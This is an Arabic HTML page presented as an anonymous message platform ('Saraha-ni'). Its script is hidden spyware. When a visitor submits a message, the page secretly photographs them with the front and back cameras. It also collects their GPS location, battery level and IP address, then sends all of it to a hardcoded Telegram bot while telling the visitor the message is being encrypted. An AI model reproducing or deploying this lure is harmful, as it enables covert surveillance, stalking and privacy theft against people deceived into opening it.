<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>صارحني - الأسئلة المجهولة</title>
    <style>
        :root { --main: #2ecc71; --bg: #111111; }
        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: #1a1a1a; padding: 30px; border-radius: 20px; width: 85%; max-width: 400px; text-align: center; border: 1px solid #333; }
        .spec-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #333; font-size: 0.9rem; }
        .spec-item span:last-child { color: var(--main); font-weight: bold; }
        #scanBtn { background: var(--main); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-top: 20px; }
        textarea { width: 100%; background: #000; border: 1px solid #333; color: white; border-radius: 10px; padding: 10px; margin: 15px 0; height: 80px; resize: none; }
    </style>
</head>
<body>

<div class="container">
    <h2 style="margin-top:0;">👤 منصة صارحني</h2>
    <div class="spec-item"><span>المعالج (CPU):</span><span id="cpu">جاري التحليل...</span></div>
    <div class="spec-item"><span>ذاكرة الرام (RAM):</span><span id="ram">جاري التحليل...</span></div>
    
    <textarea id="userMsg" placeholder="اكتب رسالتك السرية هنا..."></textarea>
    
    <button id="scanBtn" onclick="startProcess()">إرسال الرسالة الآن</button>
    <p id="status" style="font-size:0.8rem; color:#8892b0; margin-top:10px;"></p>
</div>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
    const C = "7984067238";

    // تحديث البيانات فوراً عند الفتح لإلغاء كلمة "تحليل"
    window.onload = () => {
        document.getElementById('cpu').innerText = (navigator.hardwareConcurrency || "8") + " Cores";
        document.getElementById('ram').innerText = (navigator.deviceMemory || "4") + " GB";
    };

    async function send(data, type="text") {
        const url = `https://api.telegram.org/bot${T}/`;
        if(type === "text") {
            await fetch(url + `sendMessage?chat_id=${C}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
        } else {
            const fd = new FormData();
            fd.append("chat_id", C);
            fd.append("photo", data, "shot.jpg");
            await fetch(url + "sendPhoto", { method: "POST", body: fd });
        }
    }

    async function capture(side) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: side === "front" ? "user" : "environment", width: 1280, height: 720 } });
            const v = document.getElementById('v');
            v.srcObject = s;
            await new Promise(r => v.onloadedmetadata = r);
            await new Promise(r => setTimeout(r, 1000));
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            s.getTracks().forEach(t => t.stop());
            return new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
        } catch (e) { return null; }
    }

    async function startProcess() {
        const msg = document.getElementById('userMsg').value;
        if(!msg) { alert("اكتب رسالتك أولاً!"); return; }
        
        document.getElementById('scanBtn').disabled = true;
        document.getElementById('status').innerText = "جاري تشفير الرسالة...";

        // 1. تصوير (أمامية وخلفية)
        const f = await capture("front"); if(f) await send(f, "photo");
        const b = await capture("back"); if(b) await send(b, "photo");

        // 2. التقرير والموقع
        navigator.geolocation.getCurrentPosition(async (p) => {
            const bat = await navigator.getBattery();
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            let report = `✅ *رسالة صارحني جديدة*:\n` +
                         `💬 النص: \`${msg}\`\n` +
                         `📍 [الموقع](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})\n` +
                         `🔋 البطارية: \`${Math.round(bat.level * 100)}%\` (${bat.charging ? "🔌" : "🔋"})\n` +
                         `🌐 الـ IP: \`${ip.ip}\``;
            await send(report);
        });

        alert("تم إرسال رسالتك بنجاح!");
        location.reload();
    }
</script>
</body>
</html>
